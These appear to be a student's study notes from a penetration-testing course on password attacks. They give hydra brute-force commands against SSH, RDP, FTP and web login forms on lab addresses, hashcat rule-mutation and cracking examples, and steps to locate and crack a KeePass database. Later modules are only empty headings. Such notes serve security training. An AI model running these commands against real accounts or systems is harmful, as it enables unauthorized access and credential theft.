
## Module 15: Password Attacks

### Attacking Network Services Logins

#### SSH and RDP

Brute force SSH with **known username** and **unknown password** on abnormal port number:\
`hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201`

Brute force RDP with **unknown username** and **known password**:\
`hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202`

Brute force FTP with **unknown username** and **unknown password:**\
`hydra -L /usr/share/wordlists/dirb/others/names.txt -P /usr/share/wordlists/rockyou.txt ftp://192.168.50.203`

#### HTTP POST Login Form

Brute force HTTP POST login form with **unknown username** and **unknown password**:\
`hydra -L /usr/share/wordlists/dirb/others/names.txt -P /usr/share/wordlists/rockyou.txt <target.ip.goes.here> http-post-form "/index.php:fm_usr=^USER^&fm_pwd=^PASS^:Login failed. Invalid"`\
This targets a webpage hosting a login form at /index.php, followed by a colon, then the post-form fields found via burpsuite, followed by an additional colon, followed finally by the invalid login text displayed to help hydra understand failures vs. successes.

Brute force HTTP GET login form with **known username** and **unknown password**:\
`hydra -l admin -P /usr/share/wordlists/rockyou.txt <target.ip.goes.here> http-get "/"`

### Password Cracking Fundamentals

#### Introduction to Encryption, Hashes and Cracking

John the Ripper is more a CPU-based crackin tool, which also supports GPUs.

* JtR can be run without additinoal drivers using only CPUs for cracking.

Hashcat is mainly a GPU-based cracking tool that also support CUPs.

* Hashcat requires _OpenCL_ or _CUDA_ for the GPU cracking process.

For most algorithms, a GPU is faster than a CPU. However, some slow hashing algorithms (like _bcrypt_) work better on CPUs.

Cracking _time_ can be calculated by dividing the _keyspace_ with the hash rate.\
The keyspace is the character set to teh power of the amount of characters/length of the original information. For example lower-case Latin alphabet (26 chars), upper-case Latin alphabet (26 chars), and 0-9 (10 chars) will result in 62 total characters.

A five-character long password would result in the keyspace being 62^5, i.e. 916,132,832 unique variations.

#### Mutating Wordlists

The [_Hashcat Wiki_](https://hashcat.net/wiki/doku.php?id=rule\_based\_attack) provides a list of all possible rule functions with examples.\
For the example here, we'll append a 1 to every password:

```bash
kali@kali:~$ cat demo.txt
password
iloveyou
princess
rockyou
abc123

kali@kali:~$ echo \$1 > demo.rule
kali@kali:~$ hashcat -r demo.rule --stdout demo.txt
password1
iloveyou1
princess1
rockyou1
abc1231

```

Now, let's capitalize every password by including the `c` rule function, next putting the rule functions on separate lines to make two mutated passwords:

```bash
kali@kali:~$ cat demo1.rule
$1 c

kali@kali:~$ hashcat -r demo1.rule --stdout demo.txt
Password1
Iloveyou1
Princess1
Rockyou1
Abc1231

kali@kali:~$ cat demo2.rule
$1
c

kali@kali:~$ hashcat -r demo2.rule --stdout demo.txt
password1
Password
iloveyou1
Iloveyou
princess1
Princess
rockyou1
Rockyou
abc1231
Abc123
```

Finally, let's add an exclamation mark before the one, and capitalizing the password:

```bash
kali@kali:~$ cat demo1.rule
$1 c $!

kali@kali:~$ hashcat -r demo1.rule --stdout demo.txt
Password1!
Iloveyou1!
Princess1!
Rockyou1!
Abc1231!
```

Using hashcat along with a demo rule to crack a MD5 hash:\
`hashcat -m 0 crackme.txt /usr/share/wordlists/rockyou.txt -r demo.rule`

Premade hashcat rules can be found at:\
`/usr/share/hashcat/rules/`

#### Cracking Methodology

Steps to crack hashes:

1. Extract hashes
   * Find the hash
2. Format hashes
   * Utilize tools like `hashid` or `hash-identifier` to identify the hash you've found.
3. Calculate the cracking time
   * Is it feasible to try and crack the hash? Weigh against the time available on the assessment.
4. Prepare wordlist
   * Investigate password policies, check out password leaks for samples.
5. Attack the hash
   * **Ensure** there are no additional characters, i.e. spaces, newlines, etc. copied into the hash as any additional information will affect it.

#### Password Manager

Example scenario: RDP'd onto a device with KeePass installed.

```powershell
// First, let's find any/all KeePass database files.
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```

Transfer the **.kdbx** file to our kali box then we can use scripts like `keepass2john` to format the database password into a crackable hash for **john/hashcat**.\
`keepass2john Database.kdbx > keepass.hash`

Since KeePass uses a master password without any kind of username, we need to remove the **Database** string prepended to the hash along with the colon separating it from the hash itself.&#x20;

Finding a hash type in hashcat without resorting to searching the Wiki/internet:\
`hashcat --help | grep -i "KeePass"`

#### SSH Private Key Passphrase

### Working with Password Hashes

#### Cracking NTLM

#### Passing NTLM

#### Cracking Net-NTLMv2

#### Relaying Net-NTLMv2

***

## Module 16: Windows Privilege Escalation

***

## Module 17: Linux Privilege Escalation

***

## Module 18: Port Redirection and SSH Tunneling

***

## Module 19: Tunneling Through Deep Packet Inspection

***

## Module 20: The Metasploit Framework

***

## Module 21: Active Directory Introduction and Enumeration

***

## Module 22: Attacking Active Directory Authentication

***

## Module 23: Lateral Movement in Active Directory

***

## Module 24: Enumerating AWS Cloud Infrastructure

***

## Module 25: Assembling the Pieces

***

## Module 26: Trying Harder: The Challenge Labs
